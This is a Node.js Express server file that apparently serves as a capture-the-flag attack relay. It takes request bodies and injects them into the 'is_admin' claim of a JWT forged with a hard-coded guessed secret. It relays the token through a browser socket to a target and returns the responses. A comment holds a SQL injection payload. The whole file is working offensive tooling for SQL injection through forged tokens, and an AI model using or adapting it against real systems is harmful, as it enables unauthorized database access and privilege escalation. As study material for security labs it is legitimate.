const createError = require('http-errors');
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const logger = require('morgan');
const indexRouter = require('./routes/index');
const usersRouter = require('./routes/users');
const cors = require('cors')
// var bodyParser = require('body-parser')
const getRawBody = require('raw-body')
const jwt = require('jwt-simple');
const secret = "cookie";

const mongojs = require('mongojs')
const db = mongojs('queriesdb', ['queries'])


const app = express();

// app.use(bodyParser.text());
// app.use(bodyParser.urlencoded({ extended: false }));

app.use(logger('dev'));

app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use(cors())

app.use(function (req, res, next) {
    getRawBody(req, {
        length: req.headers['content-length'],
        limit: '1mb',
        encoding: 'utf-8'
    }, function (err, string) {
        if (err) return next(err)
        req.text = string
        next()
    })
})


let chromeSocket;

app.setSocket = function (socket) {
    console.log("Set Socket"); // open mobile.html first!!!
    chromeSocket = socket;
}

app.updateResponse = function (id, data) {
    db.queries.findAndModify({
        query: {_id: mongojs.ObjectId(id)},
        update: {
            $set:
                {
                    has_ran: "complete",
                    data: data
                }
        },
        new: true
    }, function (err, doc, lastErrorObject) {
        console.log("doc has_ran: complete");
    })

}
// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');


// endpoint for sending messages to chrome
app.get('/proxy', function (req, res) {

    // insert into mongo. get the _id
    if (chromeSocket) {
        chromeSocket.emit("mensaje", req.query);
    }

    // poll mongo until answer is found for this _id
    res.send(req.query);
});


function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

async function waitforit(_id, res) {

    console.log(_id);
    let out = false;
    while (!out) {
        db.queries.findOne(
            {
                _id: mongojs.ObjectId(_id),
                has_ran: "complete"
            },
            function (err, doc) {
                if (doc) {
                    if (!out){
                        res.send(doc.data);
                    }
                    out = true;
                }
            }
        );

        await sleep(0.5);
    }

}

app.post('/*', function (req, res) {

    let payload=
        {"id":"1337","username":"guest","password":"h4x0r","email":"guest@where.ever","is_admin":"no"+ req.text };

    // ' OR 1=2 --
    let pwn = jwt.encode(payload, secret);
    // let pwn = req.text;

    // insert into mongo. get the _id
    const query = {
        text: pwn,
        create_time: new Date(),
        has_ran: 'init'
    };

    db.queries.insert(query, function (err, http) {
        if (chromeSocket) {
            chromeSocket.emit("mensaje", {
                text: pwn,
                id: http._id,
                contentType: req.headers['content-type']
            });
        }

        waitforit(http._id, res);
    });

    // poll mongo until answer is found for this _id
    // console.log(req.text);
    // res.send(req.text);
});

app.use('/', indexRouter);
app.use('/users', usersRouter);

// catch 404 and forward to error handler
app.use(function (req, res, next) {
    next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
});

module.exports = app;
